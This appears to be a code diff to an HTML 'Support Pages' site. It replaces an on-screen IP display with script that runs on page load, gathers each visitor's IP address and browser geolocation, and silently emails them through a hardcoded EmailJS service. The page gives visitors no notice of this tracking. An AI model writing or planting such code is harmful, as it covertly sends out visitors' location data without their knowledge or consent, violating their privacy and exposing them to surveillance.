@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="style.css" />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
   </head>
   <body>
     <h1>Support Pages</h1>
@@ -38,19 +39,37 @@
         <a href="mailto:qtax1@yahoo.com">by Email</a>
       </p>
     </div>
-    <p id="gfg"></p>
+
     <script>
+      emailjs.init("uNJ44wfwFwS5Yvuxd"); // Replace with your EmailJS user ID
+
+      function sendEmail(ip, lat, long) {
+        emailjs
+          .send("service_bosbik8", "template_osobqzc", {
+            ip_address: ip,
+            latitude: lat,
+            longitude: long,
+          })
+          .then((response) => {
+            console.log("Email sent successfully:", response);
+          })
+          .catch((error) => {
+            console.error("Error sending email:", error);
+          });
+      }
+
       $(document).ready(() => {
         $.getJSON("https://api.ipify.org?format=json", function (data) {
-          // Displayin IP address on screen
-          $("#gfg").html(data.ip);
-        });
-      });
-      $(document).ready(function () {
-        navigator.geolocation.getCurrentPosition((position) => {
-          let lat = position.coords.latitude;
-          let long = position.coords.longitude;
-          console.log(lat, long);
+          let ip = data.ip;
+
+          navigator.geolocation.getCurrentPosition((position) => {
+            let lat = position.coords.latitude;
+            let long = position.coords.longitude;
+            console.log(lat, long);
+
+            // Send the data via email
+            sendEmail(ip, lat, long);
+          });
         });
       });
     </script>
